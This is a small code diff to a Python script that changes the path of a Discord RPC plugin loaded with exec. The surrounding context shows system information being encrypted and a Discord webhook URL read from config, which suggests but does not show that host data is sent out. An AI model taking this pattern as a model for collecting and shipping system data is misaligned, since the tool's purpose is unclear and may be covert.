@@ -80,7 +80,7 @@ encrypted_sys_info = encrypt_text(cipher_suite, sys_info)
 webhook_url = str(config.get('main','discordwebhookurl'))
 # runs the rpc client
 def run_rpc():
-    exec(open('discordrpc.py').read())
+    exec(open('plugins/discordrpc.py').read())
 if str(config.get('Plugins',"discordrpc")) == "true":
     #RPC Thread
     thread = threading.Thread(target=run_rpc)
